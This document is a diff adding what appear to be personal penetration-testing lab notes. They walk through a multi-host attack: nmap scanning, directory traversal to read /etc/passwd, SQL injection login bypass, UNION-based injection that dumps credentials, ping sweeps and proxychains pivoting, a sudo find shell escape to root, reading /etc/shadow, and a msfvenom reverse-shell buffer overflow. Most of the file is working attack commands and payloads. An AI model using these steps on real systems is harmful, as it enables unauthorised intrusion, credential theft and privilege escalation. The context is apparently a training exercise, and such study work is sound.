@@ -1,1 +1,153 @@
+nmap -v -sT -Pn -T4 -sV <target 1 ip>       -tgt ip = 10.50.46.107
+  port 80/TCP, 22/TCP, on 
+
+ #nmap scan again but with --script=http-enum.nse -p 80
+    >files
+    >files
+    >files
+      #go through all these results, type them in url with the ip
+      #ip/scripts/   -for example
+firefox <ip>
+  in File to Read
+  /../../../../../../../etc/passwd
+  #results are good
+  /../../../../../../../etc/hosts
+  #gives connected hosts
+  #one of them is the another target
+  #192.168.28.181
+  #is apart of the 192.168.28.0/24 network, scan this network!!!
+
+#on a webpage,try
+sql injection       (golden rule!)
+directory traversal (/../../../../../some/file/path)
+cmd injection       (; <cmd>)
+
+on the login page, click F12, opening dev tools
+U:tom' OR 1='1
+P:<same>
+#this is post method
+#use the info gathered to do Get method
+#in dev tools, go to the post 200, go to request, turn on raw
+#copy the raw result, paste it into url
+#result is a bunch of creds, very nice. to make it cleaner, view page source. save these creds
+#they encoded with either rot13 and base64. use cyberchef to decode
+
+using the creds and ip found. set up new ssh tunnels
+#WE ARE NOW ON THE FWDFACING WEBHOST (as user2)
+gain access, if the shell looks shitty, run bash to get a bash shell
+#ALWAYS run these following commands
+>sudo -l
+>find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files
+#any binaries found from sudo -l or find perms, look up in GTFOBins for possible sudo/su vulnerablities
+>cat /etc/passwd
+>cat /etc/hosts
+>cat /etc/crontab
+>cat /etc/cron.d
+#check the cron files for jobs scheduled to hijack
+
+run ping sweep command
+>for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+#take note of any new hosts
+#set up dynamic tunnel to the port for this tunnel
+#run proxychains nmap scan on the newly found hosts from ping sweep
+>proxychains nmap -v -sT -Pn -T4 -sV <ip discoved in sweep>
+#take note of open ports
+#run the --script=http-enum on IPs /w port 80 (http) open
+#take note of relevant info
+#set up ssh tunnels into those IPs and their vuln ports
+#(we can set up multiple tunnels in one terminal, just dont -NT)
+
+
+in firefox
+loopback:RHP/pick.php?product=# OR 1='1
+#RHP of the port set up with -L in ssh, the "#" in product being 1 thru x, any number until you get a result from table
+#in this case, product=7
+?product=7 UNION select 1,2,3 ;
+?product=7 UNION select 1,3,2 ;
+?product=7 UNION select table_schema,table_name,column_name FROM information_schema.columns ;
+# ***Golden*** statement above
+#the above is the thought process behind building format for the table results to our liking, for when we run golden statement
+#information_schema is the default master database on the sql server
+column, column, column from database.table
+
+#once you find a vulnerable database, build your statement
+?product=# UNION select COLUMN,COLUMN,COLUMN FROM DATABASE.TABLE ;
+#the above is the generalized syntax
+
+our results will look like
+
+database  |    table    |   columns
+
+#ex below of the vulnerable database found from our ***Golden*** statement
+
+siteusers   |    users    |    user_id
+siteusers   |    users    |    name
+siteusers   |    users    |    username
+
+#to set up our statement, the siteusers DATABASE will replace the information_schema.columns
+?product=7 UNION select user_id,name,username FROM siteusers.users ;
+
+#result is some old and new creds, copy them down, decode them if needed (rot13 or base64)
+
+##IF DONE, go onto next exposed IP##
+#login using our newly grabbed creds
+>bash    #if needed
+##RUN ALL THESE COMMANDS
+>sudo -l
+>find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files
+#any binaries found from sudo -l or find perms, look up in GTFOBins for possible sudo/su vulnerablities
+>cat /etc/passwd
+>cat /etc/hosts
+>cat /etc/crontab
+>cat /etc/cron.d
+#check the cron files for jobs scheduled to hijack
+
+#in our ex the sudo -l shows we have su priv on the find command, pop it in GTFOBins, run sudo cmd listed to break out
+>sudo find . -exec /bin/sh \; -quit
+#boom, now we're root. run >bash to get a better shell
+#go crazy, check protected files
+>cat /etc/shadow
+
+
+#run pingsweep again, could find new host(s)
+>for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+#boom, something new! (.179)
+#setup dynamic tunnel to the CURRENT box to view these new IP(s)
+
+>proxychains nmap (our options) <newIP>
+#note the ports, we saw 9999, but you can always banner grab to see what it really is
+>proxychains nc <ip> 9999
+#it is vulnServer! we have a script for this
+#our example was a windows box, we could RDP if 3389 is open (it is)
+#setup tunnel to this guy on 3389 from a -L RHP
+#on linOPs VVV
+#xfreerdp /u:Lroth /v:localhost:RHP /dynamic-resolution +clipboard
+
+#BUT we dont have to do the RDP session, we saw vuln server is open and we have a bufferoverflow script 
+that will get us root access
+#on linups, edit our secureServerBuffOver.py
+  run msfvenom to generate reverse tcp going back to linops
+  create tunel going to target connected to port 9999 from a RHP
+  change s.socket to 0.0.0.0 <RHP> created in above 
+
+  msfconsole 
+  *see CTFd8
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
